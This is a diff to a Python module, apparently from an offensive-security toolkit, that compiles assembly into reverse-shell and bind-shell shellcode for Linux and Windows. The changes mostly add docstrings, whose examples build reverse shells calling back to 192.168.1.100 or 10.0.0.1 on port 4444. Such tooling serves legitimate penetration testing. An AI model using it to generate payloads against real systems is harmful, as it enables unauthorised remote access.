@@ -12,18 +12,52 @@ logger = logging.getLogger(settings.app_branding)
 
 
 class AssemblyCompiler:
-    """Compile assembly source files to shellcode using Docker + NASM"""
+    """Docker-based assembly compiler for shellcode generation.
+
+    Compiles .asm source files to raw shellcode bytes using NASM assembler
+    running in isolated Docker containers. Supports Linux and Windows targets
+    in both x86 and x64 architectures.
+
+    Attributes:
+        data_dir: Path to shellcode source directory (data/shellcodes/)
+
+    Example:
+        >>> compiler = AssemblyCompiler()
+        >>> shellcode = compiler.compile(
+        ...     os_target='linux',
+        ...     arch='x64',
+        ...     shell_type='reverse',
+        ...     ip='192.168.1.100',
+        ...     port=4444
+        ... )
+        >>> len(shellcode)
+        87
+    """
 
     def __init__(self):
-        """Initialize assembly compiler."""
-        # Get data directory containing assembly sources
+        """Initialize assembly compiler.
+
+        Raises:
+            RuntimeError: If shellcode data directory not found
+        """
         self.data_dir = Path(__file__).parent.parent / "data" / "shellcodes"
         if not self.data_dir.exists():
             raise RuntimeError(f"Shellcode data directory not found: {self.data_dir}")
 
     def _get_source_path(self, os_target: str, arch: str, shell_type: str) -> Path:
-        """Get path to assembly source file."""
-        # Map architecture names
+        """Locate assembly source file for specified target.
+
+        Args:
+            os_target: Operating system ('linux', 'windows')
+            arch: Architecture ('x86', 'x64')
+            shell_type: Shell type ('reverse', 'bind')
+
+        Returns:
+            Path to .asm source file
+
+        Raises:
+            FileNotFoundError: If source file doesn't exist
+        """
         arch_dir = arch if arch == "x64" else ""
 
         if arch_dir:
@@ -44,7 +78,18 @@ class AssemblyCompiler:
         return source_file
 
     def _get_dockerfile_path(self, os_target: str, arch: str) -> Path:
-        """Get path to Dockerfile for compilation."""
+        """Locate Dockerfile for building compiler image.
+
+        Args:
+            os_target: Operating system ('linux', 'windows')
+            arch: Architecture ('x86', 'x64')
+
+        Returns:
+            Path to Dockerfile
+
+        Raises:
+            FileNotFoundError: If Dockerfile doesn't exist
+        """
         arch_dir = arch if arch == "x64" else ""
 
         if arch_dir:
@@ -58,7 +103,21 @@ class AssemblyCompiler:
         return dockerfile
 
     def _build_docker_image(self, os_target: str, arch: str) -> str:
-        """Build Docker image for compilation."""
+        """Build Docker image containing NASM compiler.
+
+        Creates a Docker image with NASM assembler and required dependencies
+        for the specified target platform.
+
+        Args:
+            os_target: Operating system ('linux', 'windows')
+            arch: Architecture ('x86', 'x64')
+
+        Returns:
+            Docker image name (e.g., 'ofx-shellcode-linux_x64:latest')
+
+        Raises:
+            RuntimeError: If Docker build fails or times out
+        """
         arch_suffix = f"_{arch}" if arch == "x64" else ""
         image_name = f"ofx-shellcode-{os_target}{arch_suffix}:latest"
 
@@ -94,39 +153,47 @@ class AssemblyCompiler:
     def compile(
         self, os_target: str, arch: str, shell_type: str, ip: str, port: int
     ) -> bytes:
-        """
-        Compile assembly source to shellcode using Docker.
+        """Compile assembly source to raw shellcode bytes.
+
+        Builds Docker image if needed, then compiles .asm source file with
+        IP and port parameters injected as environment variables.
 
         Args:
-            os_target: Target OS (linux, windows)
-            arch: Architecture (x86, x64)
-            shell_type: Shell type (reverse, bind)
-            ip: IP address (for reverse shells)
-            port: Port number
+            os_target: Target OS ('linux', 'windows')
+            arch: Architecture ('x86', 'x64')
+            shell_type: Shell type ('reverse', 'bind')
+            ip: IP address for reverse connection
+            port: Port number for connection
 
         Returns:
-            Compiled shellcode bytes
+            Raw shellcode bytes ready for injection
+
+        Raises:
+            FileNotFoundError: If source file not found
+            RuntimeError: If compilation fails or times out
+
+        Example:
+            >>> compiler = AssemblyCompiler()
+            >>> sc = compiler.compile('linux', 'x64', 'reverse', '10.0.0.1', 4444)
+            >>> sc.hex()[:20]
+            '6a29585f6a025f48'
         """
         source_file = self._get_source_path(os_target, arch, shell_type)
         image_name = self._build_docker_image(os_target, arch)
 
-        # Convert IP to hex for substitution
         ip_parts = ip.split(".")
         ip_hex = "0x" + "".join([f"{int(p):02x}" for p in ip_parts])
 
-        # Port in network byte order (big-endian)
         port_hex = f"0x{port:04x}"
 
         logger.info(
             f"Compiling {source_file.name} with IP={ip} ({ip_hex}), PORT={port} ({port_hex})"
         )
 
-        # Create temporary output directory
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
             output_file = temp_path / "shellcode.bin"
 
-            # Run Docker container to compile
             try:
                 subprocess.run(
                     [
@@ -146,16 +213,17 @@ class AssemblyCompiler:
                         "-e",
                         f"PORT_HEX={port_hex}",
                         image_name,
-                        "/src/compile.sh"
-                        if (source_file.parent / "compile.sh").exists()
-                        else f"nasm -f bin /src/{source_file.name} -o /output/shellcode.bin",
+                        (
+                            "/src/compile.sh"
+                            if (source_file.parent / "compile.sh").exists()
+                            else f"nasm -f bin /src/{source_file.name} -o /output/shellcode.bin"
+                        ),
                     ],
                     check=True,
                     capture_output=True,
                     timeout=60,
                 )
 
-                # Read compiled shellcode
                 if not output_file.exists():
                     raise RuntimeError("Compilation produced no output file")
 
@@ -170,11 +238,21 @@ class AssemblyCompiler:
                 raise RuntimeError("Compilation timed out after 60 seconds")
 
     def list_sources(self) -> dict[str, list[str]]:
-        """
-        List available assembly source files.
+        """List all available assembly source files.
+
+        Scans data directory for .asm files organized by OS and architecture.
 
         Returns:
-            Dictionary mapping "os/arch" to list of shellcode types
+            Dictionary mapping 'os/arch' to list of shellcode types
+
+        Example:
+            >>> compiler.list_sources()
+            {
+                'linux/x86': ['reverse', 'bind'],
+                'linux/x64': ['reverse', 'bind'],
+                'windows/x86': ['reverse', 'bind'],
+                'windows/x64': ['reverse', 'bind']
+            }
         """
         sources = {}
 
@@ -184,14 +262,12 @@ class AssemblyCompiler:
 
             os_name = os_dir.name
 
-            # Check x86 sources
             src_dir = os_dir / "src"
             if src_dir.exists():
                 types = [f.stem.replace("_tcp", "") for f in src_dir.glob("*.asm")]
                 if types:
                     sources[f"{os_name}/x86"] = types
 
-            # Check x64 sources
             x64_dir = os_dir / "x64" / "src"
             if x64_dir.exists():
                 types = [f.stem.replace("_tcp", "") for f in x64_dir.glob("*.asm")]
@@ -201,7 +277,6 @@ class AssemblyCompiler:
         return sources
 
 
-# Singleton instance
 _assembly_compiler: Optional[AssemblyCompiler] = None
 
 
